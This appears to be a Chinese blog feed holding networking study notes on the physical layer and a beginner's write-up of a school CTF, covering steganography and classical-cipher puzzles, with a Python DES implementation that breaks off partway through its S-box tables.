        <content type="html"><![CDATA[<h3 id="物理层的主要任务">物理层的主要任务</h3><p><img src="https://s1.vika.cn/space/2024/05/17/ce71e1a9895d48d89fc3060e91402d76" alt=""></p><ul><li>机械特性</li><li>电气特性</li><li>功能特性</li><li>过程特性</li></ul><p>码元:<strong>在使用时间域的波形表示信号时,代表不同离散数值的基本波形称为码元.</strong></p><h3 id="常用编码方式">常用编码方式:</h3><p><img src="https://s1.vika.cn/space/2024/05/18/99f43e05ab2b4977ab83b4cf8d3ba0a9" alt=""></p><p><strong>差分曼切斯特编码</strong></p><p><img src="https://s1.vika.cn/space/2024/05/18/3529cf9fea414998968d422c9d3b6ec1" alt=""></p><p>*<em>曼切斯特编码</em></p><p><img src="https://s1.vika.cn/space/2024/05/18/bc072dcb3ede4bcdb7179796637d5f0a" alt=""></p><p>信号失真的因素:</p><p><img src="https://s1.vika.cn/space/2024/05/18/532be64f95d545aaac252c4b1cdfe03c" alt=""></p><p>奈氏准则:</p><p><img src="https://s1.vika.cn/space/2024/05/18/b9c3d58cf7554bd5883161986597f655" alt=""></p><p>香农公式;</p><p><img src="https://s1.vika.cn/space/2024/05/18/0a4511d617b147339ebdec7f465cbfc6" alt=""></p><p><strong>信噪比需单独计算哦!</strong></p><p><img src="https://s1.vika.cn/space/2024/05/18/63e21d7b6c734de582c847552cc6350d" alt=""></p><p><strong>奈氏准则是指在理想无噪声信道下的最高码元传输速率</strong></p><p><strong>而香农公式则是在有噪声的信道下的最高传输速率</strong></p><p><a href="https://www.bilibili.com/video/BV1NT411g7n6/?p=16&amp;vd_source=3c7ba978da03769295ac818286171ab1">练习</a></p><h3 id="调制码元数量">调制码元数量:</h3><p><img src="https://s1.vika.cn/space/2024/05/18/3d42c7fcda4a450abb3725884929cdef" alt=""></p><blockquote><p><strong>可以调制16种码元,每种码元可以表示对应的4bit</strong></p></blockquote><h3 id="信道复用">信道复用</h3><ul><li>常见的信道复用技术:</li></ul><p><img src="https://s1.vika.cn/space/2024/05/18/e5196ce8b07e46dcb7eb055879f3e7a7" alt=""></p><p><strong>已知波长算带宽</strong></p><p><img src="https://s1.vika.cn/space/2024/05/18/253219aeeb4c4f88b504ad701ed7e02d" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 新手村的操作 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>校赛CTF初体验</title>
      <link href="/posts/732c79d3.html"/>
      <url>/posts/732c79d3.html</url>
      
        <content type="html"><![CDATA[<hr><h2 id="Welcome-to-Eviden’s-Blog-https-www-eviden-top-很久没更新咯">Welcome to Eviden’s Blog:<code>https://www.eviden.top/</code>(很久没更新咯~)</h2><hr><h2 id="Misc">Misc</h2><p><strong>emmm,之前也从来没做过misc的题,就是边学边查边做呗~</strong></p><blockquote><p>你也玩拼图</p></blockquote><p>脚本安装环境啥的自己具体查,py脚本小子还是有必要过这一关的!</p><p>这里给出我的示例命令,因为开始没跑出来</p><p><img src="https://s1.vika.cn/space/2024/05/10/f709ebdcf6ca4d649a7b85be82651f98" alt=""></p><p>命令:<a href="https://blog.csdn.net/m0_47643893/article/details/113778577">https://blog.csdn.net/m0_47643893/article/details/113778577</a></p><img src="https://s1.vika.cn/space/2024/05/10/3426c89819614f08b42c273a7f295930" style="zoom:50%;" /><p>自己慢慢试试偏移量应该就能解出来了~(学过移位密码的可以直接根据第一个字符得出偏移量~)</p><blockquote><h4 id="重生之我是ctf糕手">重生之我是ctf糕手</h4></blockquote><p>打开压缩包一顿搞,发现字体显示异常,搜索引擎开搜呗</p><p>找到一个零宽字符隐写的,ok直接找个<a href="http://330k.github.io/misc_tools/unicode_steganography.html">解密网站</a>一把梭~(注:这题解密不要密码)</p><blockquote><h4 id="签到题">签到题</h4></blockquote><p>道具题,没啥意思,找不到工具就解不出那就搁那晾着,后面出题人给出工具了那就自行网上下载咯,拖到工具答案就出来了.工具名:SilentEye</p><blockquote><h4 id="简单加密">简单加密</h4></blockquote><p><strong>开题给的提示信息就是解密密码.</strong></p><p>打开压缩包,看到base64然后 jpg的格式明显提示你 base64转图片.(我这种从来没写过misc的都能看出,各位大佬应该秒杀我lo~)</p><p>得到图片后,后面只要知道解密密码是开题的提示信息即可.具体细节我也记不太清了~</p><hr><h2 id="Crypto">Crypto</h2><p>emmm,密码学也只是上过这门课.尽力了,能写一道就算win!</p><blockquote><h4 id="Vigenere">Vigenère</h4></blockquote><p>标题就提示你了吧是什么,然后出题人还一直提示你.做过点密码学都知道,维吉尼亚密码.</p><p>ok,随便找个网站,C-V一丢,flag就出来了~</p><blockquote><h4 id="签到题-2">签到题</h4></blockquote><p>Py密码学,应该是des,这点要能判断出来,具体的加密特征和手法要了解,然后就chatgpt傻瓜式做题了~</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">_IP = [<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>,</span><br><span class="line">       <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">       <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>,</span><br><span class="line">       <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>,</span><br><span class="line">       <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>,</span><br><span class="line">       <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">       <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span></span><br><span class="line">       ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">IP</span>(<span class="params">plain: <span class="built_in">list</span>[<span class="built_in">int</span>]</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: plain[x], _IP))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__pc1 = [<span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line">         <span class="number">0</span>, <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>,</span><br><span class="line">         <span class="number">9</span>, <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>,</span><br><span class="line">         <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>,</span><br><span class="line">         <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>,</span><br><span class="line">         <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>,</span><br><span class="line">         <span class="number">13</span>, <span class="number">5</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>,</span><br><span class="line">         <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span></span><br><span class="line">         ]</span><br><span class="line"></span><br><span class="line">__pc2 = [</span><br><span class="line">    <span class="number">13</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">0</span>, <span class="number">4</span>,</span><br><span class="line">    <span class="number">2</span>, <span class="number">27</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">20</span>, <span class="number">9</span>,</span><br><span class="line">    <span class="number">22</span>, <span class="number">18</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">25</span>, <span class="number">7</span>,</span><br><span class="line">    <span class="number">43</span>, <span class="number">48</span>, <span class="number">38</span>, <span class="number">55</span>, <span class="number">33</span>, <span class="number">52</span>,</span><br><span class="line">    <span class="number">15</span>, <span class="number">6</span>, <span class="number">26</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">1</span>,</span><br><span class="line">    <span class="number">40</span>, <span class="number">51</span>, <span class="number">30</span>, <span class="number">36</span>, <span class="number">46</span>, <span class="number">54</span>,</span><br><span class="line">    <span class="number">29</span>, <span class="number">39</span>, <span class="number">50</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">47</span>,</span><br><span class="line">    <span class="number">45</span>, <span class="number">41</span>, <span class="number">49</span>, <span class="number">35</span>, <span class="number">28</span>, <span class="number">31</span></span><br><span class="line">]</span><br><span class="line">ROTATIONS = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PC_1</span>(<span class="params">key: <span class="built_in">list</span>[<span class="built_in">int</span>]</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: key[x], __pc1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PC_2</span>(<span class="params">key: <span class="built_in">list</span>[<span class="built_in">int</span>]</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: key[x], __pc2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sub_key</span>(<span class="params">key: <span class="built_in">list</span>[<span class="built_in">int</span>]</span>):</span><br><span class="line">    key = PC_1(key)  <span class="comment"># PC-1置换</span></span><br><span class="line">    L, R = key[:<span class="number">28</span>], key[<span class="number">28</span>:]  <span class="comment"># 分成两半</span></span><br><span class="line"></span><br><span class="line">    skeys = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ROTATIONS[i]):  <span class="comment"># 根据轮次左移</span></span><br><span class="line">            L = L[<span class="number">1</span>:] + L[:<span class="number">1</span>]</span><br><span class="line">            R = R[<span class="number">1</span>:] + R[:<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        skeys.append(PC_2(L + R))  <span class="comment"># PC-2置换</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> skeys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__expansion_table = [</span><br><span class="line">    <span class="number">31</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>,</span><br><span class="line">    <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>,</span><br><span class="line">    <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>,</span><br><span class="line">    <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>,</span><br><span class="line">    <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>,</span><br><span class="line">    <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>,</span><br><span class="line">    <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>,</span><br><span class="line">    <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">0</span></span><br><span class="line">]</span><br><span class="line">__sbox = [</span><br><span class="line">    <span class="comment"># S1</span></span><br><span class="line">    [<span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>,</span><br><span class="line">     <span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>,</span><br><span class="line">     <span class="number">4</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">0</span>,</span><br><span class="line">     <span class="number">15</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">13</span>],</span><br><span class="line"></span><br><span class="line">    <span class="comment"># S2</span></span><br><span class="line">    [<span class="number">15</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>,</span><br><span class="line">     <span class="number">3</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">5</span>,</span><br><span class="line">     <span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">15</span>,</span><br><span class="line">     <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">9</span>],</span><br><span class="line"></span><br><span class="line">    <span class="comment"># S3</span></span><br><span class="line">    [<span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">8</span>,</span><br><span class="line">     <span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">1</span>,</span><br><span class="line">     <span class="number">13</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">7</span>,</span><br><span class="line">     <span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">12</span>],</span><br><span class="line"></span><br><span class="line">    <span class="comment"># S4</span></span><br><span class="line">    [<span class="number">7</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">15</span>,</span><br><span class="line">     <span class="number">13</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">9</span>,</span><br><span class="line">     <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>,</span><br><span class="line">     <span class="number">3</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">14</span>],</span><br><span class="line"></span><br><span class="line">    <span class="comment"># S5</span></span><br><span class="line">    [<span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>,</span><br><span class="line">     <span class="number">14</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">6</span>,</span><br><span class="line">     <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">14</span>,</span><br><span class="line">     <span class="number">11</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">3</span>],</span><br><span class="line"></span><br><span class="line">    <span class="comment"># S6</span></span><br><span class="line">    [<span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>,</span><br><span class="line">     <span class="number">10</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">8</span>,</span><br><span class="line">     <span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">6</span>,</span><br><span class="line">     <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>],</span><br><span class="line"></span><br><span class="line">    <span class="comment"># S7</span></span><br><span class="line">    [<span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">1</span>,</span><br><span class="line">     <span class="number">13</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">6</span>,</span><br><span class="line">     <span class="number">1</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>,</span><br><span class="line">     <span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>],</span><br><span class="line"></span><br><span class="line">    <span class="comment"># S8</span></span><br><span class="line">    [<span class="number">13</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">7</span>,</span><br><span class="line">     <span 